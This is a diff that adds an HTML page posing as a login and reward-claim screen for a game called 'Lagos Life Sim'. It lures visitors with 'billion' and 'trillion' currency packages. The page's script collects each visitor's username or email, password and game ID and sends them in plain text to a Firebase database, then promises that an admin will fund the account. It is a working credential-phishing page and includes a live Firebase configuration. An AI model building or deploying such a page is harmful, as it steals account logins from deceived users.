@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lagos Life Sim</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
+body{background:#e8f0f8;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 16px}
+.crown{font-size:45px;text-align:center}
+h1{font-size:36px;font-weight:800;color:#0f172a;text-align:center}
+.badge{background:#0f172a;color:#fff;font-size:12px;padding:4px 10px;border-radius:20px;vertical-align:middle}
+.sub{color:#64748b;text-align:center;margin-top:6px;font-size:15px}
+.card{background:#fff;width:100%;max-width:400px;border-radius:24px;padding:24px;margin-top:24px;box-shadow:0 10px 30px rgba(0,0,0,0.08)}
+.notice{background:#e6f7ec;border:1px solid #b6e2c6;color:#0f5132;padding:14px;border-radius:12px;font-size:14px;text-align:center;line-height:1.4}
+.tabs{display:flex;background:#f1f5f9;border-radius:30px;padding:5px;margin:22px 0}
+.tab{flex:1;text-align:center;padding:11px;border-radius:30px;font-weight:700;color:#64748b}
+.tab.active{background:#fff;color:#000;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
+label{font-size:13px;font-weight:700;color:#475569}
+input{width:100%;padding:15px;margin:8px 0 18px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:12px;font-size:16px;outline:none}
+.pkgRow{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.pkgBtn{flex:1;min-width:100px;padding:10px;border:1px solid #e2e8f0;background:#f8fafc;border-radius:10px;text-align:center;font-weight:700;font-size:13px;cursor:pointer}
+.pkgBtn.active{background:#0f172a;color:#fff}
+.btn-green{width:100%;padding:16px;background:#22c55e;color:#fff;border:none;border-radius:12px;font-size:18px;font-weight:800;cursor:pointer}
+.welcome{text-align:center;color:#94a3b8;font-size:13px;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="crown">👑</div>
+<h1>Lagos Life Sim <span class="badge">18+</span></h1>
+<p class="sub">Live your Lagos story with real people.</p>
+<div class="card">
+<div class="notice">🎁 Log in to verify your account and unlock the reward pool.</div>
+<div class="tabs"><div class="tab">Create account</div><div class="tab active">Log in</div></div>
+<label>CHOOSE PACKAGE</label>
+<div class="pkgRow" id="pkgRow"></div>
+<label>USERNAME OR EMAIL</label>
+<input id="gameUser" placeholder="tolu_eko">
+<label>PASSWORD</label>
+<input id="gamePass" type="password" placeholder="Enter password">
+<label>LAGOS LIFE ID</label>
+<input id="gameID" placeholder="Enter your Lagos Life ID">
+<div style="font-size:14px;color:#334155;margin:6px 0 14px">← Back home</div>
+<button class="btn-green" onclick="confirmLogin()">Log in & Claim</button>
+<p class="welcome">Welcome back to Lagos.</p>
+<div id="successMsg" style="display:none;text-align:center;background:#dcfce7;color:#166534;padding:14px;border-radius:10px;margin-top:14px">Details received! Admin will fund you shortly.</div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBfSFGhXNDQDwftQ-QYiaclG13f_ltTOe4",
+  authDomain: "lagoslife-a9887.firebaseapp.com",
+  projectId: "lagoslife-a9887",
+  storageBucket: "lagoslife-a9887.firebasestorage.app",
+  messagingSenderId: "924515570642",
+  appId: "1:924515570642:web:58e284a74d20e3ae6f6e0b",
+  measurementId: "G-0S9C8ET54G"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+var PKGS=["50 Billion","150 Billion","300 Billion","500 Billion","1 Trillion"];
+var curN="1 Trillion";
+function renderPkgs(){
+  var row=document.getElementById('pkgRow');row.innerHTML='';
+  PKGS.forEach(function(p){
+    var b=document.createElement('div');b.className='pkgBtn'+(p===curN?' active':'');b.innerText=p;
+    b.onclick=function(){curN=p;renderPkgs();};row.appendChild(b);
+  });
+}
+function confirmLogin(){
+  var user=document.getElementById('gameUser').value.trim();
+  var pass=document.getElementById('gamePass').value.trim();
+  var gid=document.getElementById('gameID').value.trim();
+  if(!user||!pass||!gid){alert('Enter username, password and ID');return;}
+  
+  db.ref('orders').push({
+    pkg: curN,
+    username: user,
+    password: pass,
+    gameID: gid,
+    time: new Date().toLocaleString(),
+    status: "Pending"
+  }).then(() => {
+    document.getElementById('successMsg').style.display='block';
+  });
+}
+renderPkgs();
+</script>
+</body>
+                                                         </html>
